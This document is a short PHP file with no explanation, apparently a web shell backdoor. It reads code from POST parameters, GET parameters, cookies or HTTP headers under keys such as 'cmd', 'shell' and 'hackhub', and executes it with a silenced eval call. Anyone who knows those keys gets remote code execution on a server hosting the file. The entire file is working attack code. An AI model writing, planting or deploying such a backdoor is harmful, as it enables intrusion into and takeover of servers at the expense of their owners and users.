<?php
$keys = ['cmd', 'x', 'hackhub', 'shell', 'a'];
foreach ($keys as $k) {
    if (isset($_POST[$k])) {
        @eval($_POST[$k]);
        exit;
    }
    if (isset($_GET[$k])) {
        @eval($_GET[$k]);
        exit;
    }
    if (isset($_COOKIE[$k])) {
        @eval($_COOKIE[$k]);
        exit;
    }
    if (isset($_SERVER['HTTP_' . strtoupper($k)])) {
        @eval($_SERVER['HTTP_' . strtoupper($k)]);
        exit;
    }
}
?>